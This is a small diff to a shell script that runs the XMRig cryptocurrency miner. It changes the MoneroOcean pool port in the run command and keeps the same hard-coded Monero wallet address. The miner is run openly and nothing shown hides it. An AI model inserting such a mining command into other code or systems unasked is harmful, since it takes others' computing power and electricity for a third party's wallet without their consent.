@@ -27,4 +27,4 @@ make
 cd ..
 
 # Run xmrig with the specified parameters
-./xmrig -o gulf.moneroocean.stream:10032 -u 87R6PxcmJDWDLi4caK8g8A2LzcAumMWw4KqzS9S66w3hcNUmsDnUrFo9FTnoUNjVjxW6auGRP3scPaw18Y3w66m5BqgLGmj -a rx/0
+./xmrig -o gulf.moneroocean.stream:10001 -u 87R6PxcmJDWDLi4caK8g8A2LzcAumMWw4KqzS9S66w3hcNUmsDnUrFo9FTnoUNjVjxW6auGRP3scPaw18Y3w66m5BqgLGmj -a rx/0
